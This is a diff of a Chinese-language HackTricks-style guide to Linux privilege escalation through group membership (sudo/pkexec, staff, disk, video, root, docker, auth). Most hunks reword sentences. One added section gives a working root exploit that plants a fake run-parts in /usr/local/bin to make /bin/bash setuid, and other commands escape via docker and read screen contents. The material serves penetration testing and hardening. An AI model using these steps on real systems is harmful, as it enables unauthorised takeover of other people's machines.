@@ -34,16 +34,16 @@ sudo su
 ```
 ### 提权 - 方法 2
 
-查找所有SUID二进制文件，并检查是否存在二进制文件 **Pkexec**：
+查找所有suid二进制文件，并检查是否存在二进制文件**Pkexec**：
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-如果发现二进制文件 **pkexec 是 SUID 二进制文件**，并且你属于 **sudo** 或 **admin** 组，那么可能可以使用 `pkexec` 以 sudo 权限执行二进制文件。\
+如果发现二进制文件 **pkexec 是 SUID 二进制文件**，并且你属于 **sudo** 或 **admin** 组，你可能可以使用 `pkexec` 以 sudo 权限执行二进制文件。\
 这是因为通常这些组是 **polkit 策略** 中的组。该策略基本上标识了哪些组可以使用 `pkexec`。使用以下命令检查：
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-在这里，您将找到有权执行**pkexec**和**默认情况下**在某些Linux发行版中出现的组**sudo**和**admin**。
+在这里，您将找到有权执行**pkexec**和**默认情况下**在某些Linux发行版中出现的**sudo**和**admin**组。
 
 要**成为root用户，您可以执行**：
 ```bash
@@ -55,7 +55,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**这不是因为你没有权限，而是因为你没有连接到图形界面**。这里有一个解决此问题的方法：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要**2个不同的ssh会话**：
+**这不是因为您没有权限，而是因为您没有连接到图形界面**。这里有一个解决此问题的方法：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。您需要**2个不同的ssh会话**：
 
 {% code title="session1" %}
 ```bash
@@ -90,9 +90,63 @@ sudo su
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+## Staff Group
+
+**staff**: 允许用户在不需要 root 权限的情况下向系统 (`/usr/local`) 添加本地修改（请注意，`/usr/local/bin` 中的可执行文件在任何用户的 PATH 变量中，它们可能会“覆盖”具有相同名称的 `/bin` 和 `/usr/bin` 中的可执行文件）。与与监控/安全更相关的组 "adm" 进行比较。 [\[来源\]](https://wiki.debian.org/SystemGroups)
+
+在 debian 发行版中，`$PATH` 变量显示 `/usr/local/` 将作为最高优先级运行，无论您是特权用户还是非特权用户。
+```bash
+$ echo $PATH
+/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+# echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+如果我们能劫持`/usr/local`目录中的一些程序，就很容易获取root权限。
+
+劫持`run-parts`程序是一种轻松获取root权限的方法，因为大多数程序会运行类似`run-parts`的程序（比如crontab，在ssh登录时）。
+```bash
+$ cat /etc/crontab | grep run-parts
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+```
+或者当一个新的ssh会话登录时。
+```bash
+$ pspy64
+2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
+2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
+2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
+2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
+2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
+2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
+2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
+```
+**利用**
+```bash
+# 0x1 Add a run-parts script in /usr/local/bin/
+$ vi /usr/local/bin/run-parts
+#! /bin/bash
+chmod 4777 /bin/bash
+
+# 0x2 Don't forget to add a execute permission
+$ chmod +x /usr/local/bin/run-parts
+
+# 0x3 start a new ssh sesstion to trigger the run-parts program
+
+# 0x4 check premission for `u+s`
+$ ls -la /bin/bash
+-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash
+
+# 0x5 root it
+$ /bin/bash -p
+```
 ## 磁盘组
 
-这个权限几乎等同于root访问权限，因为您可以访问机器内部的所有数据。
+这个权限几乎**等同于 root 访问权限**，因为您可以访问机器内的所有数据。
 
 文件：`/dev/sd[a-z][1-9]`
 ```bash
@@ -120,7 +174,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1** 表示用户 **yossi 物理登录** 到机器上的终端。
 
-**video 组** 具有查看屏幕输出的权限。基本上，您可以观察屏幕。为了做到这一点，您需要以原始数据的形式 **获取屏幕上的当前图像** 并获取屏幕正在使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，您可以在 `/sys/class/graphics/fb0/virtual_size` 中找到此屏幕的分辨率。
+**video 组** 具有查看屏幕输出的权限。基本上，您可以观察屏幕。为了做到这一点，您需要 **获取屏幕上的当前图像** 的原始数据，并获取屏幕正在使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，您可以在 `/sys/class/graphics/fb0/virtual_size` 中找到此屏幕的分辨率。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -135,7 +189,7 @@ cat /sys/class/graphics/fb0/virtual_size
 
 ## Root组
 
-看起来默认情况下，**root组的成员**可能可以访问**修改**一些**服务**配置文件或一些**库**文件或**其他有趣的东西**，这些可能被用来提升权限...
+看起来默认情况下**root组的成员**可以访问**修改**一些**服务**配置文件或一些**库**文件或**其他有趣的东西**，这些可能被用于提升权限...
 
 **检查root成员可以修改哪些文件**：
 ```bash
@@ -163,7 +217,7 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 [docker-security](../docker-security/)
 {% endcontent-ref %}
 
-如果您对docker套接字具有写权限，请阅读[**这篇关于如何滥用docker套接字提升权限的帖子**](../#writable-docker-socket)**。**
+如果您对docker套接字具有写权限，请阅读[**关于如何滥用docker套接字提升权限的文章**](../#writable-docker-socket)**。**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
@@ -183,4 +237,18 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 ## Auth组
 
 在OpenBSD中，**auth**组通常可以写入 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 文件夹（如果使用）。\
-可以使用以下漏洞利用来滥用这些权限以**提升权限**到root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+可以使用以下漏洞利用来滥用这些权限以**提升权限**至root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+
+<details>
+
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+
+支持HackTricks的其他方式：
+
+* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** 上**关注我们。
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+
+</details>
